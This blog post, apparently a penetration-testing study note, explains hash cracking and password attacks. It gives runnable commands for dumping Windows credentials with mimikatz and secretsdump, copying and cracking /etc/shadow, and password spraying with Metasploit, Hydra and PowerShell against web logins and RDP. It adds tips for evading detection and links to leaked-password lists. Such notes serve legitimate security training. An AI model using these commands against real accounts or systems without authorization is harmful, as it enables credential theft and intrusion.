---
layout: post
title: Hash Cracking and Password Attack Techniques
date: 2025-04-10 16:30 +0300
categories: [Password Attacks]
tags: [password, hash cracking, cryptography, john the ripper, hashcat, hydra, ntlm, brute force, rainbow table, dictionary attack, salting, unshadowing, cewl, custom wordlist, rule-based attack]
---


## Table of Contents
1. [Introduction to Hash Cracking](#introduction)
2. [NTLM Hashes](#ntlm-hashes)
3. [Unshadowing](#unshadowing)
4. [Custom Wordlists with CeWL](#cewl)
5. [Rule-Based Attacks with John](#rule-based)
6. [Custom Rules in John](#custom-rules)
7. [Password Spray Attacks](#password-spray)
8. [Default, Weak and Leaked Passwords](#default,weak-and-leaked-passwords)

<a name="introduction"></a>
## 1. Introduction to Hash Cracking

Hash cracking is the process of recovering plaintext passwords from their hashed forms. Common types of hash cracking include:

- Dictionary Attacks: Using wordlists of common passwords
- Brute Force: Trying all possible character combinations
- Rule-Based: Applying modifications to dictionary words
- Rainbow Tables: Using precomputed hash tables

Common tools:
- John the Ripper
- Hashcat
- Hydra (for online attacks)

<a name="ntlm-hashes"></a>
## 2. NTLM Hashes

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that includes password hashing mechanisms.

### Characteristics
- Used in Windows environments
- Modern Windows systems use NTLMv2, older used LM or NTLMv1
- Stored in the SAM database on Windows systems

### Extracting NTLM Hashes
```bash
# Using mimikatz on Windows
privilege::debug
token::elevate
lsadump::sam

# Using Impacket's secretsdump.py
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Using Metasploit
use post/windows/gather/hashdump
```

### Cracking NTLM Hashes
```bash
# With John the Ripper
john --format=nt hash.txt

# With Hashcat
hashcat -m 1000 -a 0 hashes.txt wordlist.txt
```

<a name="unshadowing"></a>
## 3. Unshadowing

Unshadowing is the process of combining the `/etc/passwd` and `/etc/shadow` files on Linux systems to prepare them for password cracking.

```bash
# Extract the files (requires root)
sudo cp /etc/passwd /tmp/passwd
sudo cp /etc/shadow /tmp/shadow

# Combine them with unshadow
unshadow /tmp/passwd /tmp/shadow > /tmp/unshadowed.txt

# Crack with John
john /tmp/unshadowed.txt
```

### Direct Cracking
You can also crack the shadow file directly with John:

```bash
john /etc/shadow
```

<a name="cewl"></a>
## 4. Custom Wordlists with CeWL

CeWL (Custom Word List generator) is a tool that spiders websites and creates custom wordlists based on the content.

### Basic Usage
```bash
# Basic spidering (depth 2)
cewl -d 2 -m 5 https://example.com -w wordlist.txt

# Include email addresses
cewl -d 2 -m 5 -e https://example.com -w wordlist.txt

# With authentication
cewl -d 2 -m 5 --auth_type basic --auth_user username --auth_pass password https://example.com -w wordlist.txt
```

### Parameters
- `-d`: Depth to spider (default: 2)
- `-m`: Minimum word length (default: 3)
- `-w`: Write output to file
- `-e`: Include email addresses
- `--with-numbers`: Include words with numbers

### Example for Target-Specific Wordlist
```bash
# Generate a wordlist from a company website
cewl -d 3 -m 6 --with-numbers https://company.com -w company_words.txt

# Further process the wordlist
sort company_words.txt | uniq > company_wordlist.txt
```

<a name="rule-based"></a>
## 5. Rule-Based Attacks with John

Rule-based attacks apply transformations to wordlist entries to generate additional password candidates.

### Using Built-in Rules
```bash
# Use the "Jumbo" rule set
john --wordlist=wordlist.txt --rules=Jumbo hashes.txt

# Use the "Single" rule set
john --wordlist=wordlist.txt --rules=Single hashes.txt

# Common rules
john --wordlist=wordlist.txt --rules=All hashes.txt
```

### Available Built-in Rules
- Single: Simple word mangling rules
- Wordlist: Default rules for wordlist mode
- Extra: More extensive set of rules
- Jumbo: Comprehensive ruleset in Jumbo builds
- KoreLogic: Rules from KoreLogic's password contests

<a name="custom-rules"></a>
## 6. Custom Rules in John

You can create custom rules to target specific password patterns.

### Rule Syntax Examples
Add to your `john.conf` file:

```
[List.Rules:Custom]
# Append years to words
$[0-9]$[0-9]$[0-9]$[0-9]

# Capitalize first letter, add special char at end
c$!

# Prefix with special characters
^[!@#$%]

# Replace letters with numbers (leetspeak)
sa@
se3
sl1
so0
```

### Using Custom Rules
```bash
# First add your rules to john.conf, then:
john --wordlist=wordlist.txt --rules=Custom hashes.txt
```

### Common Rule Functions
- `c`: Capitalize first letter
- `l`: Convert to lowercase
- `u`: Convert to uppercase
- `$X`: Append character X
- `^X`: Prepend character X
- `sXY`: Replace X with Y

<a name="password-spray"></a>
## 7. Password Spray Attacks

Password spraying is a technique that attempts a small number of commonly used passwords against many accounts to avoid account lockouts.

### Key Concepts
- Unlike brute force, password spraying uses a limited set of passwords
- Typically tries one password against all accounts, then waits before trying the next
- Designed to avoid triggering account lockout mechanisms

### Tools for Password Spraying

#### Metasploit
```bash
use auxiliary/scanner/http/http_login
set RHOSTS 192.168.1.0/24
set USER_FILE users.txt
set PASS_FILE common_passwords.txt
set USERPASS_FILE userpass.txt
set BLANK_PASSWORDS true
set USER_AS_PASS true
set STOP_ON_SUCCESS false
set BRUTEFORCE_SPEED 1
run
```

#### Hydra
```bash
# Against web form
hydra -L users.txt -p Spring2024! 10.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed"

# Against RDP
hydra -L users.txt -p Winter2023! rdp://192.168.1.100
```

#### PowerShell Empire - Invoke-DomainPasswordSpray
```powershell
Invoke-DomainPasswordSpray -UserList users.txt -Password Company123! -Delay 30 -OutFile spray_results.txt
```

### Creating a Password Spray List
Common patterns for corporate environments:
```
Company123!
Season+Year+Symbol (Spring2023!)
Month+Year+Symbol (April2023!)
Company+Month+Year (CompanyApr23)
Welcome+Number (Welcome123)
```

### Best Practices for Password Spraying
- Space out attempts (15-30 minutes between attempts)
- Monitor for account lockout policies
- Try during business hours to blend in with normal traffic
- Start with limited accounts to test detection capability
- Use VPN or proxy to avoid IP blocking

<a name="default,weak-and-leaked-passwords"></a>
# Default, Weak and Leaked Passwords

## Default Passwords

- [https://cirt.net/passwords](https://cirt.net/passwords)
- [https://default-password.info/](https://default-password.info/)
- [https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)

## Weak Passwords

- [https://www.skullsecurity.org/wiki/Passwords](https://www.skullsecurity.org/wiki/Passwords) - This includes the most well-known collections of passwords.
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) - A huge collection of all kinds of lists, not only for password cracking.

### Leaked Passwords

- [SecLists/Passwords/Leaked-Databases](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)


### Outlook web access (OWA) portal  

- [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) (atomizer.py)
- [MailSniper](https://github.com/dafthack/MailSniper)



